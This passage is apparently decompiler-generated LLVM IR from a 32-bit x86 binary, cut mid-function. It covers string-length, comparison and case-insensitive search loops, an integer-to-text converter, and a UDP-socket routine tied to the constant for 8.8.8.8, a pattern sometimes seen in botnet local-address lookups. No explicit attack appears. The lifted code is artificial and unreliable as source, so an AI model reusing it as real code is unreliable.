  %v0_8052874.pre = load i32, i32* @ebx, align 4
  br i1 %v1_8052866, label %dec_label_pc_8052874, label %dec_label_pc_8052868

dec_label_pc_8052868:                             ; preds = %dec_label_pc_8052855
  %v1_8052868 = add i32 %v0_8052874.pre, 1
  store i32 %v1_8052868, i32* @ebx, align 4
  %v0_8052869 = load i32, i32* %ebp.global-to-local, align 4
  %v7_805286b = icmp sgt i32 %v0_8052869, %v1_8052868
  br i1 %v7_805286b, label %dec_label_pc_805286d, label %dec_label_pc_8052874

dec_label_pc_805286d:                             ; preds = %dec_label_pc_8052868
  %v1_805286d = load i32, i32* %esi.global-to-local, align 4
  %v3_805286d = add i32 %v1_805286d, %v0_8052874.pre
  %v4_805286d = inttoptr i32 %v3_805286d to i8*
  %v5_805286d = load i8, i8* %v4_805286d, align 1
  %v14_805286d = icmp eq i8 %v5_805286d, 10
  %v1_8052872 = icmp eq i1 %v14_805286d, false
  br i1 %v1_8052872, label %dec_label_pc_805286d.dec_label_pc_8052855_crit_edge, label %dec_label_pc_8052874

dec_label_pc_805286d.dec_label_pc_8052855_crit_edge: ; preds = %dec_label_pc_805286d
  %v0_805285c.pre = load i32, i32* @edi, align 4
  br label %dec_label_pc_8052855

dec_label_pc_8052874:                             ; preds = %dec_label_pc_8052855, %dec_label_pc_8052868, %dec_label_pc_805286d
  %v0_8052874 = phi i32 [ %v1_8052868, %dec_label_pc_8052868 ], [ %v1_8052868, %dec_label_pc_805286d ], [ %v0_8052874.pre, %dec_label_pc_8052855 ]
  %v1_8052874 = icmp eq i32 %v0_8052874, 0
  %v1_8052876 = icmp eq i1 %v1_8052874, false
  %v0_8052883 = load i32, i32* %esi.global-to-local, align 4
  %v2_8052883 = select i1 %v1_8052876, i32 %v0_8052883, i32 0
  store i32 %v0_8052843, i32* @ebx, align 4
  store i32 %v0_8052841, i32* @edi, align 4
  ret i32 %v2_8052883

; uselistorder directives
  uselistorder i32 %v1_8052868, { 0, 1, 3, 4, 2 }
  uselistorder i32 %v0_8052874.pre, { 1, 0, 2 }
  uselistorder i32 %v1_8052865, { 1, 0 }
  uselistorder i32 (i32, i32*, i32, i32)* @function_8052d5c, { 1, 0 }
  uselistorder label %dec_label_pc_8052874, { 2, 1, 0 }
}

define i32 @function_8052890() local_unnamed_addr {
dec_label_pc_8052890:
  %esi.global-to-local = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %stack_var_-28 = alloca i32, align 4
  store i32 16, i32* %stack_var_-12, align 4
  %v1_805289d = call i32 @function_80530f9(i32 16)
  %v1_80528a2 = inttoptr i32 %v1_805289d to i32*
  store i32 0, i32* %v1_80528a2, align 4
  %v3_80528af = call i32 @function_80533b5(i32 2, i32 2, i32 0)
  store i32 %v3_80528af, i32* %esi.global-to-local, align 4
  %v10_80528bb = icmp eq i32 %v3_80528af, -1
  br i1 %v10_80528bb, label %dec_label_pc_8052902, label %dec_label_pc_80528c0

dec_label_pc_80528c0:                             ; preds = %dec_label_pc_8052890
  %v2_80528c0 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_80528c0, i32* @ebx, align 4
  store i32 2, i32* %stack_var_-28, align 4
  %v3_80528df = call i32 @function_80531da(i32 %v3_80528af, i32 %v2_80528c0, i32 16)
  %v2_80528e7 = ptrtoint i32* %stack_var_-12 to i32
  %v0_80528ed = load i32, i32* %esi.global-to-local, align 4
  %v3_80528ee = call i32 @function_8053205(i32 %v0_80528ed, i32 %v2_80528c0, i32 %v2_80528e7)
  %v1_80528f6 = call i32 @function_8052bc1(i32 %v0_80528ed)
  br label %dec_label_pc_8052902

dec_label_pc_8052902:                             ; preds = %dec_label_pc_8052890, %dec_label_pc_80528c0
  %v0_8052907 = phi i32 [ 0, %dec_label_pc_8052890 ], [ 134744072, %dec_label_pc_80528c0 ]
  ret i32 %v0_8052907

; uselistorder directives
  uselistorder i32 %v3_80528af, { 1, 0, 2 }
  uselistorder i32* %stack_var_-12, { 1, 0 }
  uselistorder i32 (i32, i32, i32)* @function_80531da, { 5, 4, 3, 2, 1, 0 }
  uselistorder i32 (i32, i32, i32)* @function_80533b5, { 8, 7, 6, 5, 1, 4, 3, 2, 0 }
  uselistorder label %dec_label_pc_8052902, { 1, 0 }
}

define i32 @function_8052910(i8* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_8052910:
  %tmp18 = inttoptr i32 %arg3 to i8*
  %v2_8052922 = load i8, i8* %tmp18, align 1
  %v3_8052922 = icmp eq i8 %v2_8052922, 0
  br i1 %v3_8052922, label %dec_label_pc_8052938, label %dec_label_pc_8052928

dec_label_pc_8052928:                             ; preds = %dec_label_pc_8052910, %dec_label_pc_8052928
  %v2_8052928 = phi i32 [ %v1_805292b, %dec_label_pc_8052928 ], [ 0, %dec_label_pc_8052910 ]
  %v1_805292b = add i32 %v2_8052928, 1
  %v2_8052932 = add i32 %v1_805292b, %arg3
  %v3_8052932 = inttoptr i32 %v2_8052932 to i8*
  %v4_8052932 = load i8, i8* %v3_8052932, align 1
  %v5_8052932 = icmp eq i8 %v4_8052932, 0
  %v1_8052936 = icmp eq i1 %v5_8052932, false
  br i1 %v1_8052936, label %dec_label_pc_8052928, label %dec_label_pc_8052938

dec_label_pc_8052938:                             ; preds = %dec_label_pc_8052928, %dec_label_pc_8052910
  %v2_805296f = phi i32 [ 0, %dec_label_pc_8052910 ], [ %v1_805292b, %dec_label_pc_8052928 ]
  %v4_805293e = ptrtoint i8* %arg1 to i32
  %tmp25 = icmp slt i32 %arg2, 1
  br i1 %tmp25, label %dec_label_pc_805296c, label %dec_label_pc_8052946.preheader

dec_label_pc_8052946.preheader:                   ; preds = %dec_label_pc_8052938
  %v4_8052946.pre = load i32, i32* @ecx, align 4
  %v6_8052948.pre = load i32, i32* @edx, align 4
  br label %dec_label_pc_8052946

dec_label_pc_8052946:                             ; preds = %dec_label_pc_8052946.preheader, %dec_label_pc_8052967
  %v0_8052967 = phi i32 [ %arg2, %dec_label_pc_8052946.preheader ], [ %v1_8052967, %dec_label_pc_8052967 ]
  %v6_8052948 = phi i32 [ %v6_8052948.pre, %dec_label_pc_8052946.preheader ], [ %v2_8052961, %dec_label_pc_8052967 ]
  %v0_8052975 = phi i32 [ 0, %dec_label_pc_8052946.preheader ], [ %v1_80529488, %dec_label_pc_8052967 ]
  %v4_8052946 = phi i32 [ %v4_8052946.pre, %dec_label_pc_8052946.preheader ], [ %v0_8052961, %dec_label_pc_8052967 ]
  %v0_805294c = phi i32 [ %v4_805293e, %dec_label_pc_8052946.preheader ], [ %v1_805294c, %dec_label_pc_8052967 ]
  %v1_8052946 = inttoptr i32 %v0_805294c to i8*
  %v2_8052946 = load i8, i8* %v1_8052946, align 1
  %v3_8052946 = zext i8 %v2_8052946 to i32
  %v5_8052946 = and i32 %v4_8052946, -256
  %v6_8052946 = or i32 %v3_8052946, %v5_8052946
  store i32 %v6_8052946, i32* @ecx, align 4
  %v2_8052948 = add i32 %v0_8052975, %arg3
  %v3_8052948 = inttoptr i32 %v2_8052948 to i8*
  %v4_8052948 = load i8, i8* %v3_8052948, align 1
  %v5_8052948 = zext i8 %v4_8052948 to i32
  %v7_8052948 = and i32 %v6_8052948, -256
  %v8_8052948 = or i32 %v5_8052948, %v7_8052948
  %v1_805294c = add i32 %v0_805294c, 1
  %v1_805294d = add i8 %v2_8052946, -65
  %v8_8052952 = icmp ugt i8 %v1_805294d, 25
  br i1 %v8_8052952, label %dec_label_pc_8052957, label %dec_label_pc_8052954

dec_label_pc_8052954:                             ; preds = %dec_label_pc_8052946
  %v1_8052954 = or i32 %v6_8052946, 96
  store i32 %v1_8052954, i32* @ecx, align 4
  br label %dec_label_pc_8052957

dec_label_pc_8052957:                             ; preds = %dec_label_pc_8052946, %dec_label_pc_8052954
  %v0_8052961 = phi i32 [ %v6_8052946, %dec_label_pc_8052946 ], [ %v1_8052954, %dec_label_pc_8052954 ]
  %v1_8052957 = add i8 %v4_8052948, -65
  %v8_805295c = icmp ugt i8 %v1_8052957, 25
  br i1 %v8_805295c, label %dec_label_pc_8052961, label %dec_label_pc_805295e

dec_label_pc_805295e:                             ; preds = %dec_label_pc_8052957
  %v1_805295e = or i32 %v8_8052948, 96
  br label %dec_label_pc_8052961

dec_label_pc_8052961:                             ; preds = %dec_label_pc_8052957, %dec_label_pc_805295e
  %v2_8052961 = phi i32 [ %v8_8052948, %dec_label_pc_8052957 ], [ %v1_805295e, %dec_label_pc_805295e ]
  %v1_8052961 = trunc i32 %v0_8052961 to i8
  %v3_8052961 = trunc i32 %v2_8052961 to i8
  %v15_8052961 = icmp eq i8 %v1_8052961, %v3_8052961
  br i1 %v15_8052961, label %dec_label_pc_8052975, label %dec_label_pc_8052965

dec_label_pc_8052965:                             ; preds = %dec_label_pc_8052961
  br label %dec_label_pc_8052967

dec_label_pc_8052967:                             ; preds = %dec_label_pc_8052975, %dec_label_pc_8052965
  %v1_80529488 = phi i32 [ %v1_8052975, %dec_label_pc_8052975 ], [ 0, %dec_label_pc_8052965 ]
  %v1_8052967 = add i32 %v0_8052967, -1
  %tmp26 = icmp slt i32 %v1_8052967, 1
  %tmp27 = icmp eq i1 %tmp26, false
  br i1 %tmp27, label %dec_label_pc_8052946, label %dec_label_pc_805296c

dec_label_pc_805296c:                             ; preds = %dec_label_pc_8052967, %dec_label_pc_8052938
  store i32 %v2_805296f, i32* @edx, align 4
  ret i32 -1

dec_label_pc_8052975:                             ; preds = %dec_label_pc_8052961
  %v1_8052975 = add i32 %v0_8052975, 1
  %v14_8052976 = icmp eq i32 %v2_805296f, %v1_8052975
  %v1_8052979 = icmp eq i1 %v14_8052976, false
  br i1 %v1_8052979, label %dec_label_pc_8052967, label %dec_label_pc_805297b

dec_label_pc_805297b:                             ; preds = %dec_label_pc_8052975
  store i32 %v4_805293e, i32* @ecx, align 4
  %v2_8052981 = sub i32 %v1_805294c, %v4_805293e
  store i32 %v2_805296f, i32* @edx, align 4
  ret i32 %v2_8052981

; uselistorder directives
  uselistorder i32 %v1_8052967, { 1, 0 }
  uselistorder i32 %v0_8052975, { 1, 0 }
  uselistorder i32 %v4_805293e, { 2, 1, 0 }
  uselistorder i32 %v2_805296f, { 2, 0, 1 }
  uselistorder i8 25, { 1, 2, 3, 0 }
  uselistorder label %dec_label_pc_8052961, { 1, 0 }
  uselistorder label %dec_label_pc_8052957, { 1, 0 }
  uselistorder label %dec_label_pc_8052946, { 1, 0 }
  uselistorder label %dec_label_pc_8052928, { 1, 0 }
}

define i32 @function_8052990() local_unnamed_addr {
dec_label_pc_8052990:
  %tmp = call i8* @__decompiler_undefined_function_2()
  %tmp13 = call i8* @__decompiler_undefined_function_2()
  %v4_8052992 = ptrtoint i8* %tmp13 to i32
  %v4_8052998 = ptrtoint i8* %tmp to i32
  %v2_805299c = load i8, i8* %tmp13, align 1
  %v3_805299c = icmp eq i8 %v2_805299c, 0
  br i1 %v3_805299c, label %dec_label_pc_80529a8, label %dec_label_pc_80529a1

dec_label_pc_80529a1:                             ; preds = %dec_label_pc_8052990, %dec_label_pc_80529a1
  %v0_80529a1 = phi i32 [ %v1_80529a1, %dec_label_pc_80529a1 ], [ 0, %dec_label_pc_8052990 ]
  %v1_80529a1 = add i32 %v0_80529a1, 1
  %v2_80529a2 = add i32 %v1_80529a1, %v4_8052992
  %v3_80529a2 = inttoptr i32 %v2_80529a2 to i8*
  %v4_80529a2 = load i8, i8* %v3_80529a2, align 1
  %v5_80529a2 = icmp eq i8 %v4_80529a2, 0
  %v1_80529a6 = icmp eq i1 %v5_80529a2, false
  br i1 %v1_80529a6, label %dec_label_pc_80529a1, label %dec_label_pc_80529a8

dec_label_pc_80529a8:                             ; preds = %dec_label_pc_80529a1, %dec_label_pc_8052990
  %v0_80529b9 = phi i32 [ 0, %dec_label_pc_8052990 ], [ %v1_80529a1, %dec_label_pc_80529a1 ]
  %v2_80529aa = load i8, i8* %tmp, align 1
  %v3_80529aa = icmp eq i8 %v2_80529aa, 0
  br i1 %v3_80529aa, label %dec_label_pc_80529b7, label %dec_label_pc_80529b0

dec_label_pc_80529b0:                             ; preds = %dec_label_pc_80529a8, %dec_label_pc_80529b0
  %v0_80529b0 = phi i32 [ %v1_80529b0, %dec_label_pc_80529b0 ], [ 0, %dec_label_pc_80529a8 ]
  %v1_80529b0 = add i32 %v0_80529b0, 1
  %v2_80529b1 = add i32 %v1_80529b0, %v4_8052998
  %v3_80529b1 = inttoptr i32 %v2_80529b1 to i8*
  %v4_80529b1 = load i8, i8* %v3_80529b1, align 1
  %v5_80529b1 = icmp eq i8 %v4_80529b1, 0
  %v1_80529b5 = icmp eq i1 %v5_80529b1, false
  br i1 %v1_80529b5, label %dec_label_pc_80529b0, label %dec_label_pc_80529b7

dec_label_pc_80529b7:                             ; preds = %dec_label_pc_80529b0, %dec_label_pc_80529a8
  %v0_80529b7 = phi i32 [ 0, %dec_label_pc_80529a8 ], [ %v1_80529b0, %dec_label_pc_80529b0 ]
  store i32 %v0_80529b7, i32* @edx, align 4
  %v12_80529b9 = icmp eq i32 %v0_80529b9, %v0_80529b7
  br i1 %v12_80529b9, label %dec_label_pc_80529c4.preheader, label %dec_label_pc_80529bd

dec_label_pc_80529c4.preheader:                   ; preds = %dec_label_pc_80529b7
  %v1_80529c417 = add i32 %v0_80529b9, -1
  store i32 %v1_80529c417, i32* @edx, align 4
  %v10_80529c518 = icmp eq i32 %v0_80529b9, 0
  br i1 %v10_80529c518, label %dec_label_pc_80529d2, label %dec_label_pc_80529ca

dec_label_pc_80529bd:                             ; preds = %dec_label_pc_80529ca, %dec_label_pc_80529b7
  ret i32 0

dec_label_pc_80529c2:                             ; preds = %dec_label_pc_80529ca
  %v3_80529ca = zext i8 %v2_80529ca to i32
  %v5_80529ca = and i32 %v4_80529ca20, -256
  %v6_80529ca = or i32 %v3_80529ca, %v5_80529ca
  %v1_80529c2 = add i32 %v0_80529c221, 1
  %v1_80529c3 = add i32 %v0_80529c319, 1
  %v1_80529c4 = add i32 %v1_80529c422, -1
  store i32 %v1_80529c4, i32* @edx, align 4
  %v10_80529c5 = icmp eq i32 %v1_80529c422, 0
  br i1 %v10_80529c5, label %dec_label_pc_80529d2, label %dec_label_pc_80529ca

dec_label_pc_80529ca:                             ; preds = %dec_label_pc_80529c4.preheader, %dec_label_pc_80529c2
  %v1_80529c422 = phi i32 [ %v1_80529c4, %dec_label_pc_80529c2 ], [ %v1_80529c417, %dec_label_pc_80529c4.preheader ]
  %v0_80529c221 = phi i32 [ %v1_80529c2, %dec_label_pc_80529c2 ], [ %v4_8052992, %dec_label_pc_80529c4.preheader ]
  %v4_80529ca20 = phi i32 [ %v6_80529ca, %dec_label_pc_80529c2 ], [ %v0_80529b9, %dec_label_pc_80529c4.preheader ]
  %v0_80529c319 = phi i32 [ %v1_80529c3, %dec_label_pc_80529c2 ], [ %v4_8052998, %dec_label_pc_80529c4.preheader ]
  %v1_80529ca = inttoptr i32 %v0_80529c221 to i8*
  %v2_80529ca = load i8, i8* %v1_80529ca, align 1
  %v3_80529cc = inttoptr i32 %v0_80529c319 to i8*
  %v4_80529cc = load i8, i8* %v3_80529cc, align 1
  %v15_80529cc = icmp eq i8 %v2_80529ca, %v4_80529cc
  br i1 %v15_80529cc, label %dec_label_pc_80529c2, label %dec_label_pc_80529bd

dec_label_pc_80529d2:                             ; preds = %dec_label_pc_80529c2, %dec_label_pc_80529c4.preheader
  ret i32 1

; uselistorder directives
  uselistorder i32 %v1_80529c422, { 1, 0 }
  uselistorder i32 %v0_80529b9, { 0, 2, 1, 3 }
  uselistorder label %dec_label_pc_80529ca, { 1, 0 }
  uselistorder label %dec_label_pc_80529b0, { 1, 0 }
  uselistorder label %dec_label_pc_80529a1, { 1, 0 }
}

define i32 @function_80529e0() local_unnamed_addr {
dec_label_pc_80529e0:
  %tmp = call i32 @__decompiler_undefined_function_0()
  %tmp13 = call i8* @__decompiler_undefined_function_2()
  %tmp14 = call i8* @__decompiler_undefined_function_2()
  %v4_80529e2 = ptrtoint i8* %tmp14 to i32
  %v4_80529e8 = ptrtoint i8* %tmp13 to i32
  %v2_80529f0 = load i8, i8* %tmp14, align 1
  %v3_80529f0 = icmp eq i8 %v2_80529f0, 0
  br i1 %v3_80529f0, label %dec_label_pc_80529fc, label %dec_label_pc_80529f5

dec_label_pc_80529f5:                             ; preds = %dec_label_pc_80529e0, %dec_label_pc_80529f5
  %v0_80529f5 = phi i32 [ %v1_80529f5, %dec_label_pc_80529f5 ], [ 0, %dec_label_pc_80529e0 ]
  %v1_80529f5 = add i32 %v0_80529f5, 1
  %v2_80529f6 = add i32 %v1_80529f5, %v4_80529e2
  %v3_80529f6 = inttoptr i32 %v2_80529f6 to i8*
  %v4_80529f6 = load i8, i8* %v3_80529f6, align 1
  %v5_80529f6 = icmp eq i8 %v4_80529f6, 0
  %v1_80529fa = icmp eq i1 %v5_80529f6, false
  br i1 %v1_80529fa, label %dec_label_pc_80529f5, label %dec_label_pc_80529fc

dec_label_pc_80529fc:                             ; preds = %dec_label_pc_80529f5, %dec_label_pc_80529e0
  %v1_8052a0a = phi i32 [ 0, %dec_label_pc_80529e0 ], [ %v1_80529f5, %dec_label_pc_80529f5 ]
  %v2_80529fe = load i8, i8* %tmp13, align 1
  %v3_80529fe = icmp eq i8 %v2_80529fe, 0
  br i1 %v3_80529fe, label %dec_label_pc_8052a0a, label %dec_label_pc_8052a03

dec_label_pc_8052a03:                             ; preds = %dec_label_pc_80529fc, %dec_label_pc_8052a03
  %v0_8052a03 = phi i32 [ %v1_8052a03, %dec_label_pc_8052a03 ], [ 0, %dec_label_pc_80529fc ]
  %v1_8052a03 = add i32 %v0_8052a03, 1
  %v2_8052a04 = add i32 %v1_8052a03, %v4_80529e8
  %v3_8052a04 = inttoptr i32 %v2_8052a04 to i8*
  %v4_8052a04 = load i8, i8* %v3_8052a04, align 1
  %v5_8052a04 = icmp eq i8 %v4_8052a04, 0
  %v1_8052a08 = icmp eq i1 %v5_8052a04, false
  br i1 %v1_8052a08, label %dec_label_pc_8052a03, label %dec_label_pc_8052a0a

dec_label_pc_8052a0a:                             ; preds = %dec_label_pc_8052a03, %dec_label_pc_80529fc
  %v1_8052a0e = phi i32 [ 0, %dec_label_pc_80529fc ], [ %v1_8052a03, %dec_label_pc_8052a03 ]
  %v8_8052a0c = icmp sgt i32 %tmp, %v1_8052a0a
  br i1 %v8_8052a0c, label %dec_label_pc_8052a12, label %dec_label_pc_8052a0e

dec_label_pc_8052a0e:                             ; preds = %dec_label_pc_8052a0a
  %v7_8052a10 = icmp sgt i32 %tmp, %v1_8052a0e
  br i1 %v7_8052a10, label %dec_label_pc_8052a12, label %dec_label_pc_8052a19.preheader

dec_label_pc_8052a19.preheader:                   ; preds = %dec_label_pc_8052a0e
  %v10_8052a1a19 = icmp eq i32 %tmp, 0
  br i1 %v10_8052a1a19, label %dec_label_pc_8052a14, label %dec_label_pc_8052a1f

dec_label_pc_8052a12:                             ; preds = %dec_label_pc_8052a1f, %dec_label_pc_8052a0e, %dec_label_pc_8052a0a
  br label %dec_label_pc_8052a14

dec_label_pc_8052a14:                             ; preds = %dec_label_pc_8052a19.preheader, %dec_label_pc_8052a17, %dec_label_pc_8052a12
  %storemerge = phi i32 [ 0, %dec_label_pc_8052a12 ], [ 1, %dec_label_pc_8052a17 ], [ 1, %dec_label_pc_8052a19.preheader ]
  ret i32 %storemerge

dec_label_pc_8052a17:                             ; preds = %dec_label_pc_8052a1f
  %v3_8052a1f = zext i8 %v2_8052a1f to i32
  %v5_8052a1f = and i32 %v4_8052a1f21, -256
  %v6_8052a1f = or i32 %v3_8052a1f, %v5_8052a1f
  %v1_8052a17 = add i32 %v0_8052a1722, 1
  %v1_8052a18 = add i32 %v0_8052a1820, 1
  %v10_8052a1a = icmp eq i32 %v1_8052a1923, 0
  br i1 %v10_8052a1a, label %dec_label_pc_8052a14, label %dec_label_pc_8052a1f

dec_label_pc_8052a1f:                             ; preds = %dec_label_pc_8052a19.preheader, %dec_label_pc_8052a17
  %v1_8052a1923.in = phi i32 [ %v1_8052a1923, %dec_label_pc_8052a17 ], [ %tmp, %dec_label_pc_8052a19.preheader ]
  %v0_8052a1722 = phi i32 [ %v1_8052a17, %dec_label_pc_8052a17 ], [ %v4_80529e2, %dec_label_pc_8052a19.preheader ]
  %v4_8052a1f21 = phi i32 [ %v6_8052a1f, %dec_label_pc_8052a17 ], [ %v1_8052a0e, %dec_label_pc_8052a19.preheader ]
  %v0_8052a1820 = phi i32 [ %v1_8052a18, %dec_label_pc_8052a17 ], [ %v4_80529e8, %dec_label_pc_8052a19.preheader ]
  %v1_8052a1923 = add i32 %v1_8052a1923.in, -1
  %v1_8052a1f = inttoptr i32 %v0_8052a1722 to i8*
  %v2_8052a1f = load i8, i8* %v1_8052a1f, align 1
  %v3_8052a21 = inttoptr i32 %v0_8052a1820 to i8*
  %v4_8052a21 = load i8, i8* %v3_8052a21, align 1
  %v15_8052a21 = icmp eq i8 %v2_8052a1f, %v4_8052a21
  br i1 %v15_8052a21, label %dec_label_pc_8052a17, label %dec_label_pc_8052a12

; uselistorder directives
  uselistorder label %dec_label_pc_8052a1f, { 1, 0 }
  uselistorder label %dec_label_pc_8052a14, { 1, 2, 0 }
  uselistorder label %dec_label_pc_8052a03, { 1, 0 }
  uselistorder label %dec_label_pc_80529f5, { 1, 0 }
}

define i32 @function_8052a30(i64 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_8052a30:
  %eax.global-to-local = alloca i32, align 4
  %ebp.global-to-local = alloca i32, align 4
  %ebx.global-to-local = alloca i32, align 4
  %ecx.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %esi.global-to-local = alloca i32, align 4
  %tmp25 = inttoptr i32 %arg3 to i8*
  %stack_var_-64 = alloca i32, align 4
  %v12_8052a34 = ptrtoint i32* %stack_var_-64 to i32
  %v4_8052a3b = trunc i64 %arg1 to i32
  store i32 %v4_8052a3b, i32* %eax.global-to-local, align 4
  store i32 %arg2, i32* %esi.global-to-local, align 4
  %v2_8052a43 = icmp eq i32 %arg3, 0
  br i1 %v2_8052a43, label %dec_label_pc_8052ab0, label %dec_label_pc_8052a47

dec_label_pc_8052a47:                             ; preds = %dec_label_pc_8052a30
  %v2_8052a47 = icmp eq i32 %v4_8052a3b, 0
  %v3_8052a47 = icmp slt i32 %v4_8052a3b, 0
  br i1 %v2_8052a47, label %dec_label_pc_8052ac0, label %dec_label_pc_8052a4b

dec_label_pc_8052a4b:                             ; preds = %dec_label_pc_8052a47
  %v9_8052a50 = icmp eq i32 %arg2, 10
  br i1 %v9_8052a50, label %dec_label_pc_8052add, label %dec_label_pc_8052a59

dec_label_pc_8052a59:                             ; preds = %dec_label_pc_8052add, %dec_label_pc_8052a4b
  br label %dec_label_pc_8052a5d

dec_label_pc_8052a5d:                             ; preds = %dec_label_pc_8052ae5, %dec_label_pc_8052a59
  %storemerge35 = phi i32 [ %v4_8052a3b, %dec_label_pc_8052a59 ], [ %v1_8052ae7, %dec_label_pc_8052ae5 ]
  %v0_8052a645 = phi i32 [ %v4_8052a3b, %dec_label_pc_8052a59 ], [ %v1_8052ae7, %dec_label_pc_8052ae5 ]
  %storemerge = phi i32 [ 0, %dec_label_pc_8052a59 ], [ 1, %dec_label_pc_8052ae5 ]
  store i32 %storemerge35, i32* %ecx.global-to-local, align 4
  store i32 %storemerge, i32* %ebp.global-to-local, align 4
  store i32 32, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_8052a62

dec_label_pc_8052a62:                             ; preds = %dec_label_pc_8052a62.dec_label_pc_8052a62_crit_edge, %dec_label_pc_8052a5d
  %v2_8052a73 = phi i32 [ %v2_8052a73.pre, %dec_label_pc_8052a62.dec_label_pc_8052a62_crit_edge ], [ %v12_8052a34, %dec_label_pc_8052a5d ]
  %v3_8052a73 = phi i32 [ %v1_8052a7b, %dec_label_pc_8052a62.dec_label_pc_8052a62_crit_edge ], [ 32, %dec_label_pc_8052a5d ]
  %v0_8052a66 = phi i32 [ %v0_8052a7c, %dec_label_pc_8052a62.dec_label_pc_8052a62_crit_edge ], [ %arg2, %dec_label_pc_8052a5d ]
  %v0_8052a64 = phi i32 [ %div20, %dec_label_pc_8052a62.dec_label_pc_8052a62_crit_edge ], [ %v0_8052a645, %dec_label_pc_8052a5d ]
  %tmp32 = urem i32 %v0_8052a64, %v0_8052a66
  %v7_8052a6e = icmp sgt i32 %tmp32, 9
  %v1_8052a70.v1_8052a6b.v = select i1 %v7_8052a6e, i32 55, i32 48
  %v1_8052a70.v1_8052a6b = add i32 %v1_8052a70.v1_8052a6b.v, %tmp32
  %v1_8052a73 = trunc i32 %v1_8052a70.v1_8052a6b to i8
  %v4_8052a73 = add i32 %v3_8052a73, 14
  %v5_8052a73 = add i32 %v4_8052a73, %v2_8052a73
  %v6_8052a73 = inttoptr i32 %v5_8052a73 to i8*
  store i8 %v1_8052a73, i8* %v6_8052a73, align 1
  %v0_8052a79 = load i32, i32* %ecx.global-to-local, align 4
  %v0_8052a7b = load i32, i32* %ebx.global-to-local, align 4
  %v1_8052a7b = add i32 %v0_8052a7b, -1
  store i32 %v1_8052a7b, i32* %ebx.global-to-local, align 4
  %v0_8052a7c = load i32, i32* %esi.global-to-local, align 4
  %div20 = udiv i32 %v0_8052a79, %v0_8052a7c
  store i32 %div20, i32* %eax.global-to-local, align 4
  %tmp33 = urem i32 %v0_8052a79, %v0_8052a7c
  store i32 %tmp33, i32* %edx.global-to-local, align 4
  store i32 %div20, i32* %ecx.global-to-local, align 4
  %v1_8052a80 = icmp ugt i32 %v0_8052a7c, %v0_8052a79
  %v1_8052a82 = icmp eq i1 %v1_8052a80, false
  br i1 %v1_8052a82, label %dec_label_pc_8052a62.dec_label_pc_8052a62_crit_edge, label %dec_label_pc_8052a84

dec_label_pc_8052a62.dec_label_pc_8052a62_crit_edge: ; preds = %dec_label_pc_8052a62
  %v2_8052a73.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_8052a62

dec_label_pc_8052a84:                             ; preds = %dec_label_pc_8052a62
  %v0_8052a84 = load i32, i32* %ebp.global-to-local, align 4
  %v1_8052a84 = icmp eq i32 %v0_8052a84, 0
  %v1_8052a86 = icmp eq i1 %v1_8052a84, false
  br i1 %v1_8052a86, label %dec_label_pc_8052ad6, label %dec_label_pc_8052a88

dec_label_pc_8052a88:                             ; preds = %dec_label_pc_8052a84
  store i32 %v0_8052a7b, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_8052a89

dec_label_pc_8052a89:                             ; preds = %dec_label_pc_8052ad6, %dec_label_pc_8052a88
  %v1_8052a89 = phi i32 [ %v1_8052a89.pre, %dec_label_pc_8052ad6 ], [ %v0_8052a7b, %dec_label_pc_8052a88 ]
  %v0_8052a89 = load i32, i32* @esp, align 4
  %v2_8052a89 = add i32 %v1_8052a89, 14
  %v3_8052a89 = add i32 %v2_8052a89, %v0_8052a89
  store i32 %v3_8052a89, i32* %eax.global-to-local, align 4
  %v1_8052a8d = inttoptr i32 %v3_8052a89 to i8*
  %v2_8052a8d = load i8, i8* %v1_8052a8d, align 1
  %v3_8052a8d = icmp eq i8 %v2_8052a8d, 0
  br i1 %v3_8052a8d, label %dec_label_pc_8052af5, label %dec_label_pc_8052a92

dec_label_pc_8052a92:                             ; preds = %dec_label_pc_8052a89
  store i32 0, i32* %ecx.global-to-local, align 4
  br label %dec_label_pc_8052a94

dec_label_pc_8052a94:                             ; preds = %dec_label_pc_8052a94, %dec_label_pc_8052a92
  %v0_8052a94 = phi i32 [ %v1_8052a94, %dec_label_pc_8052a94 ], [ 0, %dec_label_pc_8052a92 ]
  %v1_8052a94 = add i32 %v0_8052a94, 1
  store i32 %v1_8052a94, i32* %ecx.global-to-local, align 4
  %v2_8052a95 = add i32 %v1_8052a94, %v3_8052a89
  %v3_8052a95 = inttoptr i32 %v2_8052a95 to i8*
  %v4_8052a95 = load i8, i8* %v3_8052a95, align 1
  %v5_8052a95 = icmp eq i8 %v4_8052a95, 0
  %v1_8052a99 = icmp eq i1 %v5_8052a95, false
  br i1 %v1_8052a99, label %dec_label_pc_8052a94, label %dec_label_pc_8052a9b

dec_label_pc_8052a9b:                             ; preds = %dec_label_pc_8052a94
  %v10_8052a9b = icmp eq i32 %v0_8052a94, -2
  br i1 %v10_8052a9b, label %dec_label_pc_8052ab0, label %dec_label_pc_8052aa0

dec_label_pc_8052aa0:                             ; preds = %dec_label_pc_8052a9b
  store i32 %arg3, i32* %ebx.global-to-local, align 4
  store i32 %v3_8052a89, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_8052aa4

dec_label_pc_8052aa4:                             ; preds = %dec_label_pc_8052af5, %dec_label_pc_8052aa0, %dec_label_pc_8052aa4.dec_label_pc_8052aa4_crit_edge
  %v2_8052aa7 = phi i32 [ %v1_8052aaa, %dec_label_pc_8052aa4.dec_label_pc_8052aa4_crit_edge ], [ %arg3, %dec_label_pc_8052aa0 ], [ %arg3, %dec_label_pc_8052af5 ]
  %v0_8052aa6 = phi i32 [ %v0_8052aab, %dec_label_pc_8052aa4.dec_label_pc_8052aa4_crit_edge ], [ %v1_8052a94, %dec_label_pc_8052aa0 ], [ 0, %dec_label_pc_8052af5 ]
  %v4_8052aa4 = phi i32 [ %v4_8052aa4.pre, %dec_label_pc_8052aa4.dec_label_pc_8052aa4_crit_edge ], [ %v3_8052a89, %dec_label_pc_8052aa0 ], [ %v3_8052a89, %dec_label_pc_8052af5 ]
